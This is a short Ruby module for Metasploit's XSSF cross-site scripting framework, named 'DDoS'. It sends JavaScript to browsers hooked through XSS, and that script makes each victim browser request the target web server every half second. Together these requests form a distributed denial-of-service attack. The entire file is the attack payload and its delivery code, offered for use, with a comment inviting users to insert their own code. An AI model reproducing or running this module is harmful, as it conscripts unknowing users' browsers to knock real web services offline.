require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer

	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'DDoS',
			'Description' => 'Attempt a distribued DoS against vulnerable web server'
		))
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
	
		code = %Q{
			setInterval(request, 500);	// Request server each 0.5 seconds
			
			function request(){
				XSSF_XHR.open("GET", '/', true);
				XSSF_XHR.send(null);
			}
		}

		send_response(cli, code)
	end
end
